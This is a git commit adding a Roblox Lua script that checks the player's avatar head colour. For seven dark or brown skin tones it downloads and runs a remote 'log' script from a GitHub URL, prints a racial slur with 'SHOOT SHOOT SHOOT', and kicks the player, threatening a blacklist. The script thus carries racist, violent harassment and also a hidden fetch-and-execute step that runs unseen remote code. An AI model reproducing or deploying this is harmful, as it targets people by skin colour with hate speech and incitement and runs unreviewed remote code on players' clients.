83b8f4227008b3513b11adad10c79578883a388e
Iratethisname10 <115908538+Iratethisname10@users.noreply.github.com>
2022-11-20 09:30:10 +0800

    Add files via upload

---
+++ genDetect.lua
@@ -0,0 +1,51 @@
+local lxr = game.Players.LocalPlayer
+local lxrb = lxr.Character.Head.BrickColor
+
+if lxrb ==  BrickColor.new("Really black") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
+
+if lxrb ==  BrickColor.new("Burnt Sienna") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
+
+if lxrb ==  BrickColor.new("Reddish brown") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
+
+if lxrb ==  BrickColor.new("Medium brown") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
+
+if lxrb ==  BrickColor.new("Brown") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
+
+if lxrb ==  BrickColor.new("Pine Cone") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
+
+if lxrb ==  BrickColor.new("Dark taupe") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/decteclog.lua"))()
+    print("NIGGER!!! SHOOT SHOOT SHOOT\nCode: true Nigga")
+    wait(2)
+    lxr:Kick("pls change your color or you will be blaclisted")
+end
